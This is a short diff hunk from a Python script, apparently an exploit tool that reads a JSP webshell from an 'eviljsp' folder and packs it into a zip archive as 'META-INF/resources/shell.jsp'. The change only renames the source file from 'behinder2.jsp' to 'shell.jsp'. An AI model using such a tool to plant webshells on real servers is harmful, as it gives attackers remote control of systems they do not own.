@@ -17,7 +17,7 @@ for b in range(0,128): # ASCII
 
 if __name__ == '__main__':
     padding_char = 'A'
-    raw_filename = 'behinder2.jsp'
+    raw_filename = 'shell.jsp'
     zip_entity_filename = 'META-INF/resources/shell.jsp'
     num = 1
     tmpCode = open("eviljsp/" + raw_filename, "r").read()
